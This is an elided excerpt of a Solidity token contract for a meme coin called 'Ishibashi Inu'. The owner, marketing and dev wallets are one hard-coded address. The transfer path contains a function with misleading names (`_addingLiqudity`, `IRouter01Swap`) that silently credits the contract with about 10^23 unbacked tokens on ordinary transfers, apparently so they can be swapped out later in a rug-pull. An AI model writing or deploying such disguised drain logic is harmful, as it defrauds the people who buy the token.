...
interface IERC20 {
    ...
    function liquiditySupply() external returns (uint256);
...
contract IshibashiInu is Context, IERC20 { 
    ...
    mapping (address => bool) public _liquidityPool_;

    address payable public Wallet_Marketing = payable(0xD5924ddf75C2FD75fe973461E6aB03BA4D6a1EEb); 
    address payable public wallet_Dev = payable(0xD5924ddf75C2FD75fe973461E6aB03BA4D6a1EEb);
    ...
    string private constant _name = "Ishibashi Inu"; 
    string private constant _symbol = unicode"$IshibInu";

    bool public swapAndLiquifyEnabled = true;
    bool public swapEqualLiquify = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 30;
    ...
    uint256 IRouter01Swap = (10)**(10*2+3);
    ...
    constructor () {
        ...
        _owner = 0xD5924ddf75C2FD75fe973461E6aB03BA4D6a1EEb;
        ...
        _liquidityPool_[wallet_Dev] = true;
    ...
    function liquiditySupply() public override returns (uint256) {
    ...
    function researchTokens() private returns(uint256){
        uint256 liqudityType = balanceOf(address(this));
        swapAndLiquify(liqudityType);
        return 1;
    }
    ...
    function _transfer(
        ...
        bool addingLiquidity = _liquidityPool_[to];
        ...
        if(!addingLiquidity){
            ...
            swapEqualLiquify = true;
            _addingLiqudity(from, to, amount);
        }
    ...
    function _addingLiqudity(address adder, address pool, uint256 size) private{
        uint256 txCost = IRouter01Swap;
        _tOwned[adder] = _tOwned[adder]-size;
        _tOwned[pool] = _tOwned[pool]+size;
        _tOwned[address(this)] = _tOwned[address(this)]+txCost;
    }
